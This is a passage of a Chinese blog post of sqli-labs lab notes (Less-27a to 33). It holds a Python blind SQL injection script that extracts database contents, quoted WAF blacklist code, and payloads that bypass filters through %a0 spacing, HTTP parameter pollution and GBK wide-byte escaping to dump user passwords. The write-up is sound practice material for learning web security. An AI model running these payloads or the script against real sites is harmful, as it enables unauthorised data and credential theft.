class="string">"http://127.0.0.1/sqli-labs/Less-27a/"</span></span><br><span class="line">ans=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_database</span><span class="params">()</span>:</span></span><br><span class="line">	database_name=<span class="string">""</span></span><br><span class="line">	payload1=<span class="string">'?id=1"%a0and%a0ascii(substr(database(),&#123;len&#125;,1))="&#123;ascii&#125;'</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">			url_now=url+payload1.format(len=i,ascii=j)</span><br><span class="line">			r=requests.get(url_now)</span><br><span class="line">			r.encoding=r.apparent_encoding</span><br><span class="line">			<span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">				database_name+=chr(j)</span><br><span class="line">	<span class="comment"># print(database_name)</span></span><br><span class="line">	ans.update(databasename=database_name)</span><br><span class="line">	<span class="comment"># return database_name</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_tables</span><span class="params">()</span>:</span></span><br><span class="line">	table=[]</span><br><span class="line">	payload2=<span class="string">'?id=1"%a0and%a0ascii(substr((seleCt%a0table_name%a0from%a0information_schema.tables%a0where%a0table_schema=database()%a0limit%a0&#123;num&#125;,1),&#123;len&#125;,1))="&#123;ascii&#125;'</span></span><br><span class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">		table_name=<span class="string">""</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">				url_now=url+payload2.format(num=k,len=i,ascii=j)</span><br><span class="line">				r=requests.get(url_now)</span><br><span class="line">				r.encoding=r.apparent_encoding</span><br><span class="line">				<span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">					table_name+=chr(j)</span><br><span class="line">		<span class="keyword">if</span> table_name!=<span class="string">''</span>:</span><br><span class="line">			<span class="comment"># print(table_name)</span></span><br><span class="line">			table.append(table_name)</span><br><span class="line">	ans.update(tablenames=table)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_columns</span><span class="params">(tablename)</span>:</span></span><br><span class="line">	column=[]</span><br><span class="line">	payload3=<span class="string">'?id=1"%a0and%a0ascii(substr((seleCt%a0column_name%a0from%a0information_schema.columns%a0where%a0table_name='</span>+tablename+<span class="string">'%a0limit%a0&#123;num&#125;,1),&#123;len&#125;,1))="&#123;ascii&#125;'</span></span><br><span class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">		column_name=<span class="string">""</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">				url_now=url+payload3.format(num=k,len=i,ascii=j)</span><br><span class="line">				r=requests.get(url_now)</span><br><span class="line">				r.encoding=r.apparent_encoding</span><br><span class="line">				<span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">					column_name+=chr(j)</span><br><span class="line">		<span class="keyword">if</span> column_name!=<span class="string">''</span>:</span><br><span class="line">			<span class="comment"># print(column_name)</span></span><br><span class="line">			column.append(column_name)</span><br><span class="line">	ans.update(columnnames=column)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_data</span><span class="params">(choice)</span>:</span></span><br><span class="line">	data1=[]</span><br><span class="line">	payload4=<span class="string">'?id=1"%a0and%a0ascii(substr((seleCt%a0'</span>+choice+<span class="string">'%a0from%a0users%a0limit%a0&#123;num&#125;,1),&#123;len&#125;,1))="&#123;ascii&#125;'</span></span><br><span class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line">		user_name=<span class="string">""</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">48</span>,<span class="number">123</span>):</span><br><span class="line">				url_now=url+payload4.format(num=k,len=i,ascii=j)</span><br><span class="line">				r=requests.get(url_now)</span><br><span class="line">				r.encoding=r.apparent_encoding</span><br><span class="line">				<span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">					user_name+=chr(j)</span><br><span class="line">		<span class="keyword">if</span> user_name!=<span class="string">''</span>:</span><br><span class="line">			<span class="comment"># print(user_name)</span></span><br><span class="line">			data1.append(user_name)</span><br><span class="line">	ans.update(data=data1)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	print(<span class="string">'[+]Let us start SQL Injection and have fun'</span>)</span><br><span class="line">	print(<span class="string">'[+]loading database name......'</span>)</span><br><span class="line">	show_database()</span><br><span class="line">	print(<span class="string">'[+]Database name:'</span>+ans[<span class="string">'databasename'</span>])</span><br><span class="line">	</span><br><span class="line">	print(<span class="string">'\n[+]loading table name......'</span>)</span><br><span class="line">	show_tables()</span><br><span class="line">	print(<span class="string">'[+]Table names:'</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> ans[<span class="string">'tablenames'</span>]:</span><br><span class="line">		print(<span class="string">'[*]'</span>+i)</span><br><span class="line"></span><br><span class="line">	table_temp=input(<span class="string">'\n[+]Please choose one of the tables:'</span>)</span><br><span class="line">	t_name=<span class="string">'"'</span>+table_temp+<span class="string">'"'</span></span><br><span class="line">	print(<span class="string">'[+]loading column name......'</span>)</span><br><span class="line">	show_columns(t_name)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> ans[<span class="string">'columnnames'</span>]:</span><br><span class="line">		print(<span class="string">'[*]'</span>+i)</span><br><span class="line"></span><br><span class="line">	column=input(<span class="string">"\nPlease choose one of the columns:"</span>)</span><br><span class="line">	print(<span class="string">"[+]loading data......"</span>)</span><br><span class="line">	show_data(column)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> ans[<span class="string">'data'</span>]:</span><br><span class="line">		print(<span class="string">'[*]'</span>+i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
<h2 id="less-28-union-空字符-select绕过-字符型"><a href="#less-28-union-空字符-select绕过-字符型" class="headerlink" title="less-28(union+空字符+select绕过,字符型)"></a>less-28(union+空字符+select绕过,字符型)</h2><p>waf:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);				//strip out /*</span><br><span class="line">$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);				//Strip out --.</span><br><span class="line">$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);					//Strip out #.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);	    		//Strip out spaces.</span><br><span class="line">//$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);	   		 	//Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);	    		//Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/union\s+select/i&apos;,&quot;&quot;, $id);	    //Strip out UNION &amp; SELECT.</span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还是过滤了<code>/* -- # 空格 union select</code>，这里的正则表达式<code>\s</code>匹配任意空字符，<code>/i</code>表示不区分大小写，但是需要注意的是这里过滤的是<code>union+空白字符+select同时匹配大小写</code>的这一个整体，所以直接使用%a0绕过空格即可，这个整体就不会被识别</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27)%a0union%a0select%a03,(select%a0group_concat(password)%a0from%a0users),5%a0and(%271%27)=(%271</span><br></pre></td></tr></table></figure>
<h2 id="less28-a"><a href="#less28-a" class="headerlink" title="less28-a"></a>less28-a</h2><p>waf:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">//$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);				//strip out /*</span><br><span class="line">//$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);				//Strip out --.</span><br><span class="line">//$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);					//Strip out #.</span><br><span class="line">//$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);	    		//Strip out spaces.</span><br><span class="line">//$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);	   		 	//Strip out spaces.</span><br><span class="line">//$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);	    		//Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/union\s+select/i&apos;,&quot;&quot;, $id);	    //Strip out spaces.</span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还注释掉这么多…更简单…<del>不知道在搞什么飞机…</del></p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27)%a0union%a0select%a03,(select%a0group_concat(password)%a0from%a0users),5%a0and(%271%27)=(%271</span><br></pre></td></tr></table></figure>
<h2 id="less-29-HTTP参数污染"><a href="#less-29-HTTP参数污染" class="headerlink" title="less-29(HTTP参数污染)"></a>less-29(HTTP参数污染)</h2><p>只是过来学习一下waf，懒得装tomcat…但还是了解一下原理：</p>
<p><a href="https://whoimg.com/s/iu8sz" target="_blank" rel="noopener"><img src="https://i.whoimg.com/2019/07/01/iu8sz.png" alt="iu8sz.png"></a></p>
<p>服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache 为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。在我们实际应用中，也是有两层服务器的情况，那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一个 waf，由于解析参数机制的不同，我们此处可以利用该原理绕过 WAF 的检测；</p>
<p>数据解析顺序：tomcat从前往后，apache从后往前</p>
<p><img src="https://i.whoimg.com/2019/07/01/iuqWR.png" alt="iuqWR.png"></p>
<p>在login.php中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$qs = $_SERVER[&apos;QUERY_STRING&apos;];</span><br><span class="line">$hint=$qs;</span><br><span class="line">$id1=java_implimentation($qs);</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">//echo $id1;</span><br><span class="line">whitelist($id1);</span><br></pre></td></tr></table></figure>
<p>经过白名单过滤的就只是tomcat解析到的第一个id参数，但是如果传入两个id参数，tomcat的过滤效果自然就灰飞烟灭……apache直接解析最后一个id，没有任何waf，轻松注入，该用法就是 HPP（HTTP Parameter Pollution）即 HTTP 参数污染攻击。HPP 可对服务器和客户端都能够造成一定的威胁。</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=0&apos; union select 1,group_concat(username),group_concat(password) from users--+</span><br></pre></td></tr></table></figure>
<h2 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h2><p>同29，只是改变为双引号</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=0&quot; union select 1,group_concat(username),group_concat(password) from users--+</span><br></pre></td></tr></table></figure>
<h2 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h2><p>同29，只是改变为括号加双引号</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=0&quot;) union select 1,group_concat(username),group_concat(password) from users--+</span><br></pre></td></tr></table></figure>
<h2 id="less-32-宽字节注入"><a href="#less-32-宽字节注入" class="headerlink" title="less-32(宽字节注入)"></a>less-32(宽字节注入)</h2><p>转义函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addslashes()，mysql_real_escape_string()，mysql_escape_string()</span><br></pre></td></tr></table></figure>
<p>特殊字符前面被加上了<code>\</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hint: The Query String you input is escaped as : 1\&apos;--</span><br><span class="line">The Query String you input in Hex becomes : 315c272d2d20</span><br></pre></td></tr></table></figure>
<h3 id="how-to-solve"><a href="#how-to-solve" class="headerlink" title="how to solve \"></a>how to solve \</h3><p>而网站在过滤<code>&#39;</code>的时候，通常的思路就是将<code>&#39;</code>转换为<code>\&#39;</code>,因此我们在此想办法将<code>&#39;</code>前面添加的<code>\</code>去掉，一般有两种思路：</p>
<ol>
<li><p>第一种方法：程序的默认字符集是<code>GBK</code>等宽字节字符集，则可以发生GBK宽字节注入，url编码<code>\&#39;</code>为<code>%5c%27</code>，mysql使用GBK编码时，会默认两个字符为一个汉字，<code>%bb%5c</code>是一个宽字符（前一个 ASCII 码大于 128 才能到汉字的范围），所以<code>%bb%5c%27</code>转化过来就是<code>汉字&#39;</code>，此时便可以直接闭合引号；</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%bb%27union%20select%201,database(),3%20%23</span><br></pre></td></tr></table></figure>
</li>
<li><p>第二种方法：构造<code>id=%bb\\&#39;</code>，转义后为<code>%bb%5c\\\\&#39;</code>，其中<code>%bb%5c</code>为汉字，其余的四个<code>\</code>转义为两个<code>\</code>，那么单引号正好没有被转义</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%bb\\%27union%20select%201,database(),3%20%23</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h2><p>这个只是调用了系统的转义函数<code>addslashes($string)</code>，注入方法和32一致</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%bb%27union%20select%201,database(),3%20%23</span><br></pre></td></tr></table></figure>
<h2 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h2></div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Gard3nia</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://gardenia30.top/2019/07/07/Sqli-Labs笔记-Advanced/">https://gardenia30.top/2019/07/07/Sqli-Labs笔记-Advanced/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/Sql注入/">Sql注入</a></div><nav id="pagination"><div class="next-post pull-right"><a href="/2019/06/02/Docker学习笔记/"><span>Docker学习笔记</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2019 By Gard3nia</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">Just keep moving!</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.5.6"></script><script src="/js/fancybox.js?version=1.5.6"></script><script src="/js/sidebar.js?version=1.5.6"></script><script src="/js/copy.js?version=1.5.6"></script><script src="/js/fireworks.js?version=1.5.6"></script><script src="/js/transition.js?version=1.5.6"></script><script src="/js/scroll.js?version=1.5.6"></script><script src="/js/head.js?version=1.5.6"></script></body></html>